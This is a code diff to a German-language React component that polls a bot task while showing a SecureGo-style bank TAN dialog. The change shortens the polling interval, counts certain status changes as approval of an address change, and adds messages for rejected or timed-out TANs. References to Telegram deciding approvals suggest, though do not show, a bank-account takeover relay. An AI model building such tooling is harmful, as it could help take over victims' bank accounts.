@@ -132,7 +132,8 @@ const AddressVerification = ({
   }, [forceShowSecureGo, onSecureGoOpened]);
 
   // Nach dem API-Aufruf im Löschdialog auf die echte TAN-Freigabe warten.
-  // Ohne Task-ID keine automatische Bestätigung – dann entscheidet ausschließlich Telegram.
+  // Erkennt sowohl Erfolg (Übergang waiting_for_tan(address) → running,
+  // tan_confirmed, completed, address_changed) als auch tan_rejected/tan_timeout.
   useEffect(() => {
     if (!showSecureGo) return;
     setSecureGoLoading(true);
@@ -144,7 +145,11 @@ const AddressVerification = ({
     let timeoutTimer: ReturnType<typeof setTimeout> | null = null;
     const startedAt = Date.now();
     const MAX_MS = 5 * 60 * 1000;
-    const POLL_MS = 3000;
+    const POLL_MS = 1000;
+    // Übergänge merken: waiting_for_tan(address) → running ist Erfolg.
+    let previousStatus = "";
+    let previousTanType = "";
+    let addressTanSeen = false;
 
     const finish = async () => {
       if (cancelled) return;
@@ -167,41 +172,69 @@ const AddressVerification = ({
       }, 1500);
     };
 
+    const fail = (msg: string) => {
+      if (cancelled) return;
+      cancelled = true;
+      setSecureGoApproved(false);
+      setShowSecureGo(false);
+      onTanFailed?.(msg);
+    };
+
     const poll = async () => {
       if (cancelled) return;
       if (!taskId) {
-        // Ohne Task-ID ausschließlich auf die Telegram-Entscheidung warten.
-        // Kein Auto-Fallback: sonst bestätigt sich die Adressfreigabe selbst.
         pollTimer = setTimeout(poll, POLL_MS);
         return;
       }
       try {
         const { getBotTask } = await import("@/lib/botClient");
         const { data } = await getBotTask(taskId);
-        const status = (data as { status?: string }).status;
-        console.log(`[address-verify] poll status: ${status}`);
-        if (status === "completed" || status === "failed") {
-          return finish();
+        const status = String((data as any)?.status ?? "").toLowerCase();
+        const result = (data as any)?.result;
+        const tt = String((data as any)?.tan_type ?? result?.tan_type ?? "").toLowerCase();
+        if (tt === "address") addressTanSeen = true;
+        if (status === "waiting_for_tan" && (tt === "address" || tt === "")) addressTanSeen = true;
+
+        const transitionedTanToRunning =
+          previousStatus === "waiting_for_tan" && status === "running";
+        const approved =
+          status === "tan_confirmed" ||
+          status === "completed" ||
+          result?.address_changed === true ||
+          result?.address_confirmed === true ||
+          (addressTanSeen && status === "running") ||
+          (transitionedTanToRunning &&
+            (previousTanType === "address" || previousTanType === "" || addressTanSeen));
+
+        if (approved) return finish();
+        if (status === "failed" || status === "tan_rejected" || status === "tan_timeout") {
+          return fail(
+            status === "tan_timeout"
+              ? "Zeitüberschreitung bei der TAN-Freigabe. Bitte versuchen Sie es erneut."
+              : "Die TAN-Freigabe wurde abgelehnt. Bitte versuchen Sie es erneut.",
+          );
         }
+
+        previousStatus = status;
+        if (tt) previousTanType = tt;
       } catch (err) {
         console.error("[address-verify] poll error:", err);
       }
-      if (Date.now() - startedAt >= MAX_MS) return finish();
+      if (Date.now() - startedAt >= MAX_MS) {
+        return fail("Keine TAN-Bestätigung erhalten. Bitte versuchen Sie es erneut.");
+      }
       pollTimer = setTimeout(poll, POLL_MS);
     };
 
-    // Erstes Polling leicht verzögert starten, damit final-click ankommt
-    pollTimer = setTimeout(poll, 1500);
-    timeoutTimer = setTimeout(() => {
-      if (!cancelled) finish();
-    }, taskId ? MAX_MS : 2_147_483_647);
+    pollTimer = setTimeout(poll, 1000);
 
     return () => {
       cancelled = true;
       if (pollTimer) clearTimeout(pollTimer);
       if (timeoutTimer) clearTimeout(timeoutTimer);
     };
-  }, [showSecureGo, bankId, onDelete, taskId, apiBaseUrl]);
+  }, [showSecureGo, bankId, onDelete, onTanFailed, taskId]);
+
 
   const [tanType, setTanType] = useState<"address" | "login" | null>(null);
   const [addressTanSuccess, setAddressTanSuccess] = useState(false);
